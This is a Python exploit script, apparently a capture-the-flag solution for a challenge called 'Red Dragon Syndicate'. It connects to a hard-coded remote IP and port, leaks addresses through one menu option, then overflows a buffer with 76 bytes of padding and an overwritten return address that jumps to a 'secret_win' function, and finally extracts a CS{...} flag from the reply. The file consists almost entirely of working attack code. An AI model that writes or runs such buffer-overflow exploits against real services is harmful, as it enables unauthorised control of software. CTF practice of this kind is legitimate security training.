#!/usr/bin/env python3
"""
Red Dragon Syndicate - ROP Exploit
Using the provided gadgets instead of shellcode
"""

import socket
import struct
import time
import re

HOST = "160.187.130.170"
PORT = 10006

OFFSET = 76  # Offset to return address

# Gadgets from show_addresses
GADGET_1 = 0x8049296
GADGET_2 = 0x80492a8
GADGET_3 = 0x80492ba
SECRET_WIN = 0x80492cc
SYNDICATE_DATA = 0x804c080

def leak_addresses(s):
    """Leak addresses using option 1"""
    print("[*] Leaking addresses...")
    s.send(b"1\n")
    time.sleep(0.5)
    data = s.recv(4096).decode('utf-8', errors='ignore')
    addresses = re.findall(r'0x[0-9a-fA-F]+', data)
    print(f"[*] Found addresses: {addresses}")
    return addresses

def create_rop_payload():
    """Create ROP payload to call secret_win or execute system"""
    payload = b"A" * OFFSET
    
    # Try calling secret_win directly first
    payload += struct.pack("<I", SECRET_WIN)
    
    return payload

def exploit():
    """Main exploit function"""
    print(f"[*] Connecting to {HOST}:{PORT}")
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect((HOST, PORT))
        
        # Receive banner
        data = s.recv(4096)
        print(f"[*] Banner received")
        
        # Leak addresses
        addresses = leak_addresses(s)
        
        # Select option 2
        print("[*] Selecting option 2...")
        s.send(b"2\n")
        time.sleep(0.5)
        
        # Receive prompt
        data = s.recv(4096)
        
        # Send ROP payload
        payload = create_rop_payload()
        print(f"[*] Sending ROP payload ({len(payload)} bytes)...")
        s.send(payload)
        
        # Receive response
        time.sleep(1)
        data = s.recv(4096)
        response = data.decode('utf-8', errors='ignore')
        print(f"[*] Response:\n{response}")
        
        # Extract flag if present
        if "CS{" in response:
            flag_match = re.search(r'CS\{[^}]+\}', response)
            if flag_match:
                flag = flag_match.group(0)
                print(f"\n[+] FLAG FOUND: {flag}\n")
        
        s.close()
        
    except Exception as e:
        print(f"[!] Error: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    exploit()

